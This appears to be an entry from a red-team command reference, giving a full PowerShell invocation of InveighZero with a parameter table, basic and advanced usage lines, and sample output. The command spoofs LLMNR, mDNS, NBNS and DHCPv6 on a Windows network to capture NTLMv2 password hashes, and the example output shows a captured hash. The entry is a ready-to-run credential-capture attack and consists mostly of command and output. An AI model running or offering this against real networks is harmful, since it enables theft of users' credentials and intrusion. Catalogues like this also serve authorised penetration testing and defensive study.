---
type: command
executor: powershell
data: >-
  .\InveighZero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y
  -DHCPv6 Y -LLMNRv6 Y
tags:
  - poisoning
  - llmnr
  - ntlm
platforms:
  - Windows
verified: true
validated: true
---

# inveighzero-run-full-poisoning

## Command

```powershell
.\InveighZero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
```

## Description

Executes InveighZero to spoof LLMNR, mDNS, NBNS, and other protocols on Windows, capturing NTLMv2 hashes and relaying if configured.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -FileOutput | Enables file logging (Y/N) | No |
| -NBNS | Enables NBNS spoofing (Y/N) | No |
| -mDNS | Enables mDNS spoofing (Y/N) | No |
| -Proxy | Enables proxy authentication (Y/N) | No |
| -MachineAccounts | Spoofs machine accounts (Y/N) | No |
| -DHCPv6 | Enables DHCPv6 spoofing (Y/N) | No |
| -LLMNRv6 | Enables LLMNR IPv6 (Y/N) | No |

## Examples

### Basic Usage

```powershell
.\InveighZero.exe -FileOutput Y -NBNS Y -mDNS Y
```

### Advanced Usage

```powershell
.\InveighZero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -Elevated N
```

## Expected Output

```
[+] LLMNR/mDNS/NBNS Spoofer Started
[+] NBNS Spoofed Response Sent To 192.168.1.50
[+] NTLMv2 Hash Captured: user::DOMAIN:challenge:hash:...
```
Logs saved to InveighZero.log and hashes CSV.

## Related

- [[procedures/Net-NTLMv2-Hash-Capture-and-Cracking]]
- [[tools/InveighZero]]
